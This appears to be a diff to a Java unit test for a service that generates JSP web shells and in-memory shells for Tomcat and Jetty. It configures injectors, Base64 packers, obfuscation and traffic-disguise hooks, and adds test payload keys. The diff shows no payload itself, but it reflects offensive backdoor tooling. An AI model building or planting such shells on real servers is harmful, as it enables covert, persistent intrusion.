@@ -28,6 +28,7 @@ class ShellGenerationServiceTest {
         ShellGenerationOutcome outcome = service.generateWebShell(
                 WebShellGenerationCommand.builder(
                                 requestDisguise(), responseDisguise(), " jsp ")
+                        .payloadKey("service-test-key")
                         .obfuscationSteps(java.util.Collections.<String>emptyList())
                         .obfuscationSeed(301L)
                         .build());
@@ -79,8 +80,9 @@ class ShellGenerationServiceTest {
     @Test
     void websocketCommandOwnsEndpointAndHeaderDefaults() throws Exception {
         ShellGenerationOutcome outcome = service.generateMemoryShell(
-                MemoryShellGenerationCommand.builder(
+                        MemoryShellGenerationCommand.builder(
                                 requestDisguise(), responseDisguise())
+                        .payloadKey("memory-test-key")
                         .serverType("Tomcat")
                         .injectorName("WebSocketInjector")
                         .packerType("DefaultBase64")
@@ -96,9 +98,10 @@ class ShellGenerationServiceTest {
     @Test
     void tomcatUpgradeReturnsExactActivationHeaders() throws Exception {
         ShellGenerationOutcome outcome = service.generateMemoryShell(
-                MemoryShellGenerationCommand.builder(
+                        MemoryShellGenerationCommand.builder(
                                 requestDisguise(), responseDisguise())
                         .header("X-Test", "secret")
+                        .payloadKey("memory-test-key")
                         .serverType("Tomcat")
                         .injectorName("UpgradeInjector")
                         .packerType("DefaultBase64")
@@ -158,9 +161,10 @@ class ShellGenerationServiceTest {
     @Test
     void jetty5BuildsWithJavaxAndRejectsJakarta() throws Exception {
         ShellGenerationOutcome outcome = service.generateMemoryShell(
-                MemoryShellGenerationCommand.builder(
+                        MemoryShellGenerationCommand.builder(
                                 requestDisguise(), responseDisguise())
                         .header("X-Test", "secret")
+                        .payloadKey("memory-test-key")
                         .serverType("Jetty5")
                         .injectorName("FilterInjector")
                         .packerType("DefaultBase64")
@@ -171,10 +175,11 @@ class ShellGenerationServiceTest {
         assertEquals("Jetty5", outcome.getMetadata().get("serverType"));
         assertNotNull(Base64.getDecoder().decode(outcome.getContent()));
         assertThrows(IllegalArgumentException.class, () ->
-                service.generateMemoryShell(
+                                service.generateMemoryShell(
                         MemoryShellGenerationCommand.builder(
                                         requestDisguise(), responseDisguise())
                                 .header("X-Test", "secret")
+                                .payloadKey("memory-test-key")
                                 .serverType("Jetty5")
                                 .injectorName("FilterInjector")
                                 .packerType("DefaultBase64")
@@ -186,6 +191,7 @@ class ShellGenerationServiceTest {
         return MemoryShellGenerationCommand.builder(
                         requestDisguise(), responseDisguise())
                 .header("X-Test", "secret")
+                .payloadKey("memory-test-key")
                 .serverType("Tomcat")
                 .injectorName("FilterInjector")
                 .packerType("DefaultBase64");
@@ -193,15 +199,15 @@ class ShellGenerationServiceTest {
 
     private static Disguise requestDisguise() {
         Disguise disguise = new Disguise();
-        disguise.setDecodeBody(
-                "public java.util.HashMap decode(byte[] data){return new java.util.HashMap();}");
+        disguise.setTrafficDecodeBody(
+                "public byte[] decodeTraffic(byte[] data){return data;}");
         return disguise;
     }
 
     private static Disguise responseDisguise() {
         Disguise disguise = new Disguise();
-        disguise.setEncodeBody(
-                "public byte[] encode(java.util.HashMap data){return new byte[0];}");
+        disguise.setTrafficEncodeBody(
+                "public byte[] encodeTraffic(byte[] data){return data;}");
         return disguise;
     }
 
